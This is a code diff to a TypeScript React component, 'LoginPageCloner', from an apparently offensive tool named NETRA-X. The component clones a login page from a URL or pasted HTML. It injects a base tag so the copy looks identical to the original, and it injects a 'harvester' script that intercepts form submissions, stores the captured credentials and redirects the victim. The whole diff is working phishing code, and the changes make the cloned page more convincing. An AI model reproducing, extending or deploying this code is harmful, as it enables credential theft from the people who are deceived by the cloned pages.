@@ -51,6 +51,7 @@ const getHarvesterScript = (redirectUrl: string) => `
                     const updatedData = [...existingData, entry];
                     localStorage.setItem(storageKey, JSON.stringify(updatedData));
                     
+                    // Dispatch a custom event so the main app can listen for captures
                     window.dispatchEvent(new StorageEvent('storage', {
                         key: storageKey,
                         newValue: JSON.stringify(updatedData)
@@ -63,19 +64,21 @@ const getHarvesterScript = (redirectUrl: string) => `
         } catch (e) {
             console.error('NETRA-X Harvester: Error capturing form data.', e);
         } finally {
+            // Redirect after a short delay to ensure storage operation completes.
             setTimeout(() => {
                 window.location.href = '${redirectUrl}';
             }, 150);
         }
     }
 
+    // Capture form submissions cleanly without breaking the original page's scripts
     document.addEventListener('submit', function(e) {
         if (e.target && e.target.tagName === 'FORM') {
             e.preventDefault();
             e.stopPropagation();
             captureAndRedirect(e.target);
         }
-    }, true);
+    }, true); // Use capture phase to intercept submit events early
 </script>
 `;
 
@@ -108,6 +111,7 @@ export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
     
     try {
         let originalHtml = values.htmlContent;
+        let baseHrefUrl = values.urlToClone;
 
         if (values.urlToClone) {
             toast({ title: "Cloning Page...", description: "Fetching HTML content from the URL." });
@@ -115,6 +119,15 @@ export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
             originalHtml = response.htmlContent;
             // Set the value in the form so it's visible in the textarea
             form.setValue('htmlContent', originalHtml);
+        } else if (originalHtml) {
+            // If user pasted HTML, we need a base URL for relative paths.
+            // We can try to guess it from an action attribute or default to the redirect URL's origin.
+            const actionMatch = originalHtml.match(/action="([^"]+)"/);
+            if (actionMatch && actionMatch[1].startsWith('http')) {
+                baseHrefUrl = new URL(actionMatch[1]).origin;
+            } else {
+                baseHrefUrl = new URL(values.redirectUrl).origin;
+            }
         }
 
         if (!originalHtml) {
@@ -124,13 +137,21 @@ export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
         let html = originalHtml;
         const harvesterScript = getHarvesterScript(values.redirectUrl);
           
-        if (html.includes('</head>')) {
-            html = html.replace(/<\/head>/i, `<base href="${values.urlToClone || ''}"></head>`);
+        // CRUCIAL STEP: Inject a <base> tag to fix relative links (CSS, JS, images).
+        // This makes the cloned page look identical to the original.
+        if (baseHrefUrl) {
+             if (html.includes('<head>')) {
+                html = html.replace(/<head>/i, `<head>\n<base href="${baseHrefUrl}">`);
+            } else {
+                html = `<head><base href="${baseHrefUrl}"></head>${html}`;
+            }
         }
 
+        // Inject the harvester script just before the closing body tag.
         if (html.includes('</body>')) {
             html = html.replace(/<\/body>/i, `${harvesterScript}</body>`);
         } else {
+            // If no body tag, just append it.
             html += harvesterScript;
         }
 
